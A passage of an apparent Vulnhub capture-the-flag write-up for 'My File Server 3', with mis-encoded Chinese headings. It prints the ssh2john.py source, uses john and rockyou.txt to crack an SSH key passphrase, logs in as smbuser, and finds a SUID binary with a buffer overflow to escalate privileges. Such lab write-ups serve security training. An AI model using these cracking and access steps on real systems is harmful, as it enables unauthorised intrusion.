class="line"><span class="string">        is thrown).  Through the magic of python, this factory method will</span></span><br><span class="line"><span class="string">        exist in all subclasses of PKey (such as L&#123;RSAKey&#125; or L&#123;DSSKey&#125;), but</span></span><br><span class="line"><span class="string">        is useless on the abstract PKey class.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @param filename: name of the file to read</span></span><br><span class="line"><span class="string">        @type filename: str</span></span><br><span class="line"><span class="string">        @param password: an optional password to use to decrypt the key file,</span></span><br><span class="line"><span class="string">            if it&#x27;s encrypted</span></span><br><span class="line"><span class="string">        @type password: str</span></span><br><span class="line"><span class="string">        @return: a new key object based on the given private key</span></span><br><span class="line"><span class="string">        @rtype: L&#123;PKey&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @raise IOError: if there was an error reading the file</span></span><br><span class="line"><span class="string">        @raise PasswordRequiredException: if the private key file is</span></span><br><span class="line"><span class="string">            encrypted, and C&#123;password&#125; is C&#123;None&#125;</span></span><br><span class="line"><span class="string">        @raise SSHException: if the key file is invalid</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        key = cls(filename=filename, password=password)</span><br><span class="line">        <span class="keyword">return</span> key</span><br><span class="line">    from_private_key_file = classmethod(from_private_key_file)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">from_private_key</span>(<span class="params">cls, file_obj, password=None</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Create a key object by reading a private key from a file (or file-like)</span></span><br><span class="line"><span class="string">        object.  If the private key is encrypted and C&#123;password&#125; is not C&#123;None&#125;,</span></span><br><span class="line"><span class="string">        the given password will be used to decrypt the key (otherwise</span></span><br><span class="line"><span class="string">        L&#123;PasswordRequiredException&#125; is thrown).</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @param file_obj: the file to read from</span></span><br><span class="line"><span class="string">        @type file_obj: file</span></span><br><span class="line"><span class="string">        @param password: an optional password to use to decrypt the key, if it&#x27;s</span></span><br><span class="line"><span class="string">            encrypted</span></span><br><span class="line"><span class="string">        @type password: str</span></span><br><span class="line"><span class="string">        @return: a new key object based on the given private key</span></span><br><span class="line"><span class="string">        @rtype: L&#123;PKey&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @raise IOError: if there was an error reading the key</span></span><br><span class="line"><span class="string">        @raise PasswordRequiredException: if the private key file is encrypted,</span></span><br><span class="line"><span class="string">            and C&#123;password&#125; is C&#123;None&#125;</span></span><br><span class="line"><span class="string">        @raise SSHException: if the key file is invalid</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        key = cls(file_obj=file_obj, password=password)</span><br><span class="line">        <span class="keyword">return</span> key</span><br><span class="line">    from_private_key = classmethod(from_private_key)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_read_private_key_file</span>(<span class="params">self, tag, filename, password=None</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Read an SSH2-format private key file, looking for a string of the type</span></span><br><span class="line"><span class="string">        C&#123;&quot;BEGIN xxx PRIVATE KEY&quot;&#125; for some C&#123;xxx&#125;, base64-decode the text we</span></span><br><span class="line"><span class="string">        find, and return it as a string.  If the private key is encrypted and</span></span><br><span class="line"><span class="string">        C&#123;password&#125; is not C&#123;None&#125;, the given password will be used to decrypt</span></span><br><span class="line"><span class="string">        the key (otherwise L&#123;PasswordRequiredException&#125; is thrown).</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @param tag: C&#123;&quot;RSA&quot;&#125; or C&#123;&quot;DSA&quot;&#125;, the tag used to mark the data block.</span></span><br><span class="line"><span class="string">        @type tag: str</span></span><br><span class="line"><span class="string">        @param filename: name of the file to read.</span></span><br><span class="line"><span class="string">        @type filename: str</span></span><br><span class="line"><span class="string">        @param password: an optional password to use to decrypt the key file,</span></span><br><span class="line"><span class="string">            if it&#x27;s encrypted.</span></span><br><span class="line"><span class="string">        @type password: str</span></span><br><span class="line"><span class="string">        @return: data blob that makes up the private key.</span></span><br><span class="line"><span class="string">        @rtype: str</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @raise IOError: if there was an error reading the file.</span></span><br><span class="line"><span class="string">        @raise PasswordRequiredException: if the private key file is</span></span><br><span class="line"><span class="string">            encrypted, and C&#123;password&#125; is C&#123;None&#125;.</span></span><br><span class="line"><span class="string">        @raise SSHException: if the key file is invalid.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            f = open(filename, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> IOError:</span><br><span class="line">            e = sys.exc_info()[<span class="number">1</span>]</span><br><span class="line">            sys.stdout.write(<span class="string">&quot;%s\n&quot;</span> % str(e))</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        data = self._read_private_key(tag, f, password)</span><br><span class="line">        f.close()</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_read_private_key</span>(<span class="params">self, tag, f, password=None</span>):</span></span><br><span class="line">        lines = f.readlines()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;BEGIN RSA PRIVATE&quot;</span> <span class="keyword">in</span> lines[<span class="number">0</span>]:</span><br><span class="line">            tag = <span class="string">&quot;RSA&quot;</span></span><br><span class="line">            self.type = <span class="number">0</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;-----BEGIN OPENSSH PRIVATE KEY-----&quot;</span> <span class="keyword">in</span> lines[<span class="number">0</span>]:</span><br><span class="line">            <span class="comment"># new private key format for OpenSSH (automatically enabled for</span></span><br><span class="line">            <span class="comment"># keys using ed25519 signatures), ed25519 stuff is not supported</span></span><br><span class="line">            <span class="comment"># yet!</span></span><br><span class="line">            self.type = <span class="number">2</span>  <span class="comment"># bcrypt pbkdf + aes-256-cbc</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.type = <span class="number">1</span></span><br><span class="line">            tag = <span class="string">&quot;DSA&quot;</span></span><br><span class="line"></span><br><span class="line">        start = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> (start &lt; len(lines)) <span class="keyword">and</span> ((lines[start].strip() != <span class="string">&#x27;-----BEGIN &#x27;</span> + tag + <span class="string">&#x27; PRIVATE KEY-----&#x27;</span>) <span class="keyword">and</span> (lines[start].strip() != <span class="string">&#x27;-----BEGIN OPENSSH PRIVATE KEY-----&#x27;</span>)):</span><br><span class="line">            start += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> start &gt;= len(lines):</span><br><span class="line">            sys.stdout.write(<span class="string">&quot;%s is not a valid private key file\n&quot;</span> % f.name)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="comment"># parse any headers first</span></span><br><span class="line">        headers = &#123;&#125;</span><br><span class="line">        start += <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> start &lt; len(lines):</span><br><span class="line">            l = lines[start].split(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> len(l) == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            headers[l[<span class="number">0</span>].lower()] = l[<span class="number">1</span>].strip()</span><br><span class="line">            start += <span class="number">1</span></span><br><span class="line">        <span class="comment"># find end</span></span><br><span class="line">        end = start</span><br><span class="line">        <span class="keyword">while</span> ((lines[end].strip() != <span class="string">&#x27;-----END OPENSSH PRIVATE KEY-----&#x27;</span>) <span class="keyword">and</span> (lines[end].strip() != <span class="string">&#x27;-----END &#x27;</span> + tag + <span class="string">&#x27; PRIVATE KEY-----&#x27;</span>)) <span class="keyword">and</span> (end &lt; len(lines)):</span><br><span class="line">            end += <span class="number">1</span></span><br><span class="line">        <span class="comment"># if we trudged to the end of the file, just try to cope.</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = <span class="string">&#x27;&#x27;</span>.join(lines[start:end]).encode()</span><br><span class="line">            data = base64.decodestring(data)</span><br><span class="line">        <span class="keyword">except</span> base64.binascii.Error:</span><br><span class="line">            e = sys.exc_info()[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">raise</span> SSHException(<span class="string">&#x27;base64 decoding error: &#x27;</span> + str(e))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;proc-type&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> headers <span class="keyword">and</span> self.type != <span class="number">2</span>:</span><br><span class="line">            <span class="comment"># unencryped: done</span></span><br><span class="line">            sys.stderr.write(<span class="string">&quot;%s has no password!\n&quot;</span> % f.name)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="comment"># encrypted keyfile: will need a password</span></span><br><span class="line">        <span class="keyword">if</span> self.type != <span class="number">2</span> <span class="keyword">and</span> headers[<span class="string">&#x27;proc-type&#x27;</span>] != <span class="string">&#x27;4,ENCRYPTED&#x27;</span>:</span><br><span class="line">            <span class="keyword">raise</span> SSHException(<span class="string">&#x27;Unknown private key structure &quot;%s&quot;&#x27;</span> % headers[<span class="string">&#x27;proc-type&#x27;</span>])</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            encryption_type, saltstr = headers[<span class="string">&#x27;dek-info&#x27;</span>].split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">if</span> self.type != <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">raise</span> SSHException(<span class="string">&#x27;Can\&#x27;t parse DEK-info in private key file&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                encryption_type = <span class="string">&quot;AES-256-CBC&quot;</span></span><br><span class="line">                saltstr = <span class="string">&quot;fefe&quot;</span></span><br><span class="line">        <span class="keyword">if</span> encryption_type <span class="keyword">not</span> <span class="keyword">in</span> self._CIPHER_TABLE:</span><br><span class="line">            <span class="keyword">raise</span> SSHException(<span class="string">&#x27;Unknown private key cipher &quot;%s&quot;&#x27;</span> % encryption_type)</span><br><span class="line">        <span class="comment"># if no password was passed in, raise an exception pointing out that we need one</span></span><br><span class="line">        <span class="keyword">if</span> password <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">raise</span> PasswordRequiredException(<span class="string">&#x27;Private key file is encrypted&#x27;</span>)</span><br><span class="line">        cipher = self._CIPHER_TABLE[encryption_type][<span class="string">&#x27;cipher&#x27;</span>]</span><br><span class="line">        keysize = self._CIPHER_TABLE[encryption_type][<span class="string">&#x27;keysize&#x27;</span>]</span><br><span class="line">        mode = self._CIPHER_TABLE[encryption_type][<span class="string">&#x27;mode&#x27;</span>]</span><br><span class="line">        salt = unhexlify(saltstr)</span><br><span class="line">        <span class="keyword">if</span> self.type == <span class="number">2</span>:</span><br><span class="line">            salt_offset = <span class="number">47</span>  <span class="comment"># XXX is this fixed?</span></span><br><span class="line">            salt_length = <span class="number">16</span></span><br><span class="line">            saltstr = data[salt_offset:salt_offset+salt_length].encode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line">        data = binascii.hexlify(data).decode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> keysize == <span class="number">24</span>:</span><br><span class="line">            self.hashline = <span class="string">&quot;%s:$sshng$%s$%s$%s$%s$%s&quot;</span> % (f.name, <span class="number">0</span>,</span><br><span class="line">                len(salt), saltstr, len(data) // <span class="number">2</span>, data)</span><br><span class="line">        <span class="keyword">elif</span> keysize == <span class="number">16</span>:</span><br><span class="line">            self.hashline = <span class="string">&quot;%s:$sshng$%s$%s$%s$%s$%s&quot;</span> % (f.name, <span class="number">1</span>, len(saltstr) // <span class="number">2</span>,</span><br><span class="line">                saltstr, len(data) // <span class="number">2</span>, data)</span><br><span class="line">        <span class="keyword">elif</span> keysize == <span class="number">32</span> <span class="keyword">and</span> self.type == <span class="number">2</span>:  <span class="comment"># bcrypt pbkdf + aes-256-cbc</span></span><br><span class="line">            <span class="comment"># round value appears after salt</span></span><br><span class="line">            rounds = <span class="number">16</span></span><br><span class="line">            self.hashline = <span class="string">&quot;%s:$sshng$%s$%s$%s$%s$%s$%d&quot;</span> % (f.name, <span class="number">2</span>, len(saltstr) // <span class="number">2</span>,</span><br><span class="line">                saltstr, len(data) // <span class="number">2</span>, data, rounds)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            sys.stderr.write(<span class="string">&quot;%s uses unsupported cipher, please file a bug!\n&quot;</span> % f.name)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> limited:</span><br><span class="line">            key = generate_key_bytes(MD5, salt, password, keysize)</span><br><span class="line">            data = cipher.new(key, mode, salt).decrypt(data)</span><br><span class="line">            <span class="comment"># check encoding</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                d = PKCS7Encoder()</span><br><span class="line">                ddata = d.decode(data)</span><br><span class="line">                <span class="keyword">return</span> ddata</span><br><span class="line">            <span class="keyword">except</span> ValueError:  <span class="comment"># incorrect password</span></span><br><span class="line">                <span class="keyword">return</span> data</span><br><span class="line">        <span class="keyword">return</span> self.hashline  <span class="comment"># dummy value</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chunks</span>(<span class="params">l, n</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, len(l), n):</span><br><span class="line">        <span class="keyword">yield</span> l[i:i + n]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RSADSSKey</span> (<span class="params">PKey</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, msg=None, data=None, filename=None, password=None, vals=None, file_obj=None</span>):</span></span><br><span class="line">        self.n = <span class="literal">None</span></span><br><span class="line">        self.e = <span class="literal">None</span></span><br><span class="line">        self.d = <span class="literal">None</span></span><br><span class="line">        self.p = <span class="literal">None</span></span><br><span class="line">        self.q = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">if</span> file_obj <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            self._from_private_key(file_obj, password)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> filename <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            self._from_private_key_file(filename, password)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> vals <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            self.e, self.n = vals</span><br><span class="line">        self.size = bit_length(self.n)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__hash__</span>(<span class="params">self</span>):</span></span><br><span class="line">        h = hash(self.get_name())</span><br><span class="line">        h = h * <span class="number">37</span> + hash(self.e)</span><br><span class="line">        h = h * <span class="number">37</span> + hash(self.n)</span><br><span class="line">        <span class="keyword">return</span> hash(h)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_name</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ssh-rsa&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_bits</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.size</span><br><span class="line"></span><br><span class="line">    <span class="comment">###  internals...</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_from_private_key_file</span>(<span class="params">self, filename, password</span>):</span></span><br><span class="line">        data = self._read_private_key_file(<span class="string">&#x27;RSA&#x27;</span>, filename, password)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> limited:</span><br><span class="line">            sys.stdout.write(<span class="string">&quot;%s\n&quot;</span> % self.hashline)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> self.type == <span class="number">0</span>:</span><br><span class="line">                self._decode_key(data)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self._decode_dss_key(data)</span><br><span class="line">            sys.stderr.write(<span class="string">&quot;%s has no password!\n&quot;</span> % filename)</span><br><span class="line">        <span class="keyword">except</span> SSHException:</span><br><span class="line">            sys.stdout.write(<span class="string">&quot;%s\n&quot;</span> % self.hashline)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_from_private_key</span>(<span class="params">self, file_obj, password</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;used for converting older format hashes&quot;&quot;&quot;</span></span><br><span class="line">        data = self._read_private_key(<span class="string">&#x27;RSA&#x27;</span>, file_obj, password)</span><br><span class="line">        <span class="keyword">if</span> limited:</span><br><span class="line">            sys.stdout.write(<span class="string">&quot;%s\n&quot;</span> % self.hashline)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> self.type == <span class="number">0</span>:</span><br><span class="line">                self._decode_key(data)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self._decode_dss_key(data)</span><br><span class="line">            sys.stderr.write(<span class="string">&quot;%s has no password!\n&quot;</span> % file_obj.name)</span><br><span class="line">        <span class="keyword">except</span> SSHException:</span><br><span class="line">            sys.stdout.write(<span class="string">&quot;%s\n&quot;</span> % self.hashline)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_decode_key</span>(<span class="params">self, data</span>):</span></span><br><span class="line">        <span class="comment"># private key file contains:</span></span><br><span class="line">        <span class="comment"># RSAPrivateKey = &#123; version = 0, n, e, d, p, q, d mod p-1, d mod q-1, q**-1 mod p &#125;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            keylist = BER(data).decode()</span><br><span class="line">        <span class="keyword">except</span> BERException:</span><br><span class="line">            <span class="keyword">raise</span> SSHException(<span class="string">&#x27;Unable to parse key file&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> (type(keylist) <span class="keyword">is</span> <span class="keyword">not</span> list) <span class="keyword">or</span> (len(keylist) &lt; <span class="number">4</span>) <span class="keyword">or</span> (keylist[<span class="number">0</span>] != <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">raise</span> SSHException(<span class="string">&#x27;Not a valid RSA private key file (bad ber encoding)&#x27;</span>)</span><br><span class="line">        self.n = keylist[<span class="number">1</span>]</span><br><span class="line">        self.e = keylist[<span class="number">2</span>]</span><br><span class="line">        self.d = keylist[<span class="number">3</span>]</span><br><span class="line">        <span class="comment"># not really needed</span></span><br><span class="line">        self.p = keylist[<span class="number">4</span>]</span><br><span class="line">        self.q = keylist[<span class="number">5</span>]</span><br><span class="line">        self.size = bit_length(self.n)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_decode_dss_key</span>(<span class="params">self, data</span>):</span></span><br><span class="line">        <span class="comment"># private key file contains:</span></span><br><span class="line">        <span class="comment"># DSAPrivateKey = &#123; version = 0, p, q, g, y, x &#125;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            keylist = BER(data).decode()</span><br><span class="line">        <span class="keyword">except</span> BERException:</span><br><span class="line">            e = sys.exc_info()[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">raise</span> SSHException(<span class="string">&#x27;Unable to parse key file: &#x27;</span> + str(e))</span><br><span class="line">        <span class="keyword">if</span> (type(keylist) <span class="keyword">is</span> <span class="keyword">not</span> list) <span class="keyword">or</span> (len(keylist) &lt; <span class="number">6</span>) <span class="keyword">or</span> \</span><br><span class="line">                (keylist[<span class="number">0</span>] != <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">raise</span> SSHException(<span class="string">&#x27;not a valid DSA private key file (bad ber encoding)&#x27;</span>)</span><br><span class="line">        self.p = keylist[<span class="number">1</span>]</span><br><span class="line">        self.q = keylist[<span class="number">2</span>]</span><br><span class="line">        self.g = keylist[<span class="number">3</span>]</span><br><span class="line">        self.y = keylist[<span class="number">4</span>]</span><br><span class="line">        self.x = keylist[<span class="number">5</span>]</span><br><span class="line">        self.size = bit_length(self.p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># PKCS7Encoder is borrowed from http://japrogbits.blogspot.in/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PKCS7Encoder</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    RFC 2315: PKCS#7 page 21</span></span><br><span class="line"><span class="string">    Some content-encryption algorithms assume the</span></span><br><span class="line"><span class="string">    input length is a multiple of k octets, where k &gt; 1, and</span></span><br><span class="line"><span class="string">    let the application define a method for handling inputs</span></span><br><span class="line"><span class="string">    whose lengths are not a multiple of k octets. For such</span></span><br><span class="line"><span class="string">    algorithms, the method shall be to pad the input at the</span></span><br><span class="line"><span class="string">    trailing end with k - (l mod k) octets all having value k -</span></span><br><span class="line"><span class="string">    (l mod k), where l is the length of the input. In other</span></span><br><span class="line"><span class="string">    words, the input is padded at the trailing end with one of</span></span><br><span class="line"><span class="string">    the following strings:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">             01 -- if l mod k = k-1</span></span><br><span class="line"><span class="string">            02 02 -- if l mod k = k-2</span></span><br><span class="line"><span class="string">                        .</span></span><br><span class="line"><span class="string">                        .</span></span><br><span class="line"><span class="string">                        .</span></span><br><span class="line"><span class="string">          k k ... k k -- if l mod k = 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    The padding can be removed unambiguously since all input is</span></span><br><span class="line"><span class="string">    padded and no padding string is a suffix of another. This</span></span><br><span class="line"><span class="string">    padding method is well-defined if and only if k &lt; 256;</span></span><br><span class="line"><span class="string">    methods for larger k are an open issue for further study.</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, k=<span class="number">16</span></span>):</span></span><br><span class="line">        self.k = k</span><br><span class="line"></span><br><span class="line">    <span class="comment">## @param text The padded text for which the padding is to be removed.</span></span><br><span class="line">    <span class="comment"># @exception ValueError Raised when the input padding is missing or corrupt.</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">self, text</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Remove the PKCS#7 padding from a text string</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        nl = len(text)</span><br><span class="line">        val = int(binascii.hexlify(text[<span class="number">-1</span>]), <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> val &gt; self.k:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;Input is not padded or padding is corrupt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        l = nl - val</span><br><span class="line">        <span class="keyword">return</span> text[:l]</span><br><span class="line"></span><br><span class="line">    <span class="comment">## @param text The text to encode.</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">self, text</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Pad an input string according to PKCS#7</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        l = len(text)</span><br><span class="line">        output = StringIO()</span><br><span class="line">        val = self.k - (l % self.k)</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(val):</span><br><span class="line">            output.write(<span class="string">&#x27;%02x&#x27;</span> % val)</span><br><span class="line">        <span class="keyword">return</span> text + binascii.unhexlify(output.getvalue())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        sys.stdout.write(<span class="string">&quot;Usage: %s &lt; RSA/DSA private key files &gt;\n&quot;</span> % \</span><br><span class="line">                sys.argv[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> sys.argv[<span class="number">1</span>:]:</span><br><span class="line">        key = RSADSSKey.from_private_key_file(filename, <span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><code>ç ´è§£å¾—åˆ°å¯†ç ä¸ºpassword</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/ck00# vim ssh2john.py</span><br><span class="line">root@JIYE:~/vulnhub/ck00# </span><br><span class="line">root@JIYE:~/vulnhub/ck00# chmod +x ssh2john.py </span><br><span class="line">root@JIYE:~/vulnhub/ck00# ./ssh2john.py id_rsa &gt; id.hash</span><br><span class="line">root@JIYE:~/vulnhub/ck00# ls</span><br><span class="line">id.hash  id_rsa  nmap.CVT  nmap.sP  ssh2john.py  sshd_config</span><br><span class="line">root@JIYE:~/vulnhub/ck00# john id</span><br><span class="line">id.hash  id_rsa   </span><br><span class="line">root@JIYE:~/vulnhub/ck00# john id.hash --wordlist=/usr/share/wordlists/rockyou.txt </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])</span><br><span class="line">Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes</span><br><span class="line">Cost 2 (iteration count) is 1 for all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Note: This format may emit false positives, so it will keep trying even after</span><br><span class="line">finding a possible candidate.</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">password         (id_rsa)</span><br><span class="line">Warning: Only 2 candidates left, minimum 4 needed for performance.</span><br><span class="line">1g 0:00:00:03 DONE (2020-09-25 20:47) 0.2754g/s 3950Kp/s 3950Kc/s 3950KC/sa6_123..*7Â¡Vamos!</span><br><span class="line">Session completed</span><br><span class="line">root@JIYE:~/vulnhub/ck00#</span><br></pre></td></tr></table></figure>

<h2 id="0x09-ç™»å…¥"><a href="#0x09-ç™»å…¥" class="headerlink" title="0x09.ç™»å…¥"></a>0x09.ç™»å…¥</h2><p><code>ä¿®æ”¹id_rsaæƒé™ä¸º600</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@JIYE:~&#x2F;vulnhub&#x2F;ck00# chmod 600 id_rsa </span><br><span class="line">root@JIYE:~&#x2F;vulnhub&#x2F;ck00# ssh -i id_rsa smbuser@192.168.1.14</span><br><span class="line">load pubkey &quot;id_rsa&quot;: invalid format</span><br><span class="line"></span><br><span class="line">   ##############################################################################################</span><br><span class="line">   #                                      InfoSec Warrior                                       #</span><br><span class="line">   #                         --------- www.InfoSecWarrior.com ------------                      #</span><br><span class="line">   #                                    My File Server - 3                                      #</span><br><span class="line">   #                        Just a simple addition to the problem                               #</span><br><span class="line">   #                               Designed By :- CyberKnight                                   #</span><br><span class="line">   #                                Twitter    :- @CyberKnight00                                #</span><br><span class="line">   ##############################################################################################</span><br><span class="line"></span><br><span class="line">Enter passphrase for key &#39;id_rsa&#39;: </span><br><span class="line">Last login: Thu Mar 19 10:15:35 2020 from 192.168.56.1</span><br><span class="line">[smbuser@fileserver ~]$ whoami</span><br><span class="line">smbuser</span><br><span class="line">[smbuser@fileserver ~]$</span><br></pre></td></tr></table></figure>

<h2 id="0x10-ææƒ"><a href="#0x10-ææƒ" class="headerlink" title="0x10.ææƒ"></a>0x10.ææƒ</h2><p><code>æŸ¥çœ‹ç”¨æˆ·ï¼Œæœ‰ä¸€ä¸ªbla</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[smbuser@fileserver bin]$ cd /home</span><br><span class="line">[smbuser@fileserver home]$ ls</span><br><span class="line">bla  smbuser</span><br><span class="line">[smbuser@fileserver home]$</span><br></pre></td></tr></table></figure>

<p><code>æŸ¥æ‰¾åæœŸå®‰è£…è½¯ä»¶çš„è¿è¡Œè„šæœ¬</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[smbuser@fileserver home]$ cd /usr/bin/</span><br><span class="line">[smbuser@fileserver bin]$ ls -la | grep bla</span><br><span class="line">-rwsr-xr-x    1 bla  bla        7546 2æœˆ  27 2020 esclate</span><br><span class="line">[smbuser@fileserver bin]$</span><br></pre></td></tr></table></figure>

<p><code>ç»è¿‡æŸ¥å‘ç°esclateå­˜åœ¨bufferoverflowï¼ˆç¼“å†²åŒºæº¢å‡ºï¼‰</code></p>
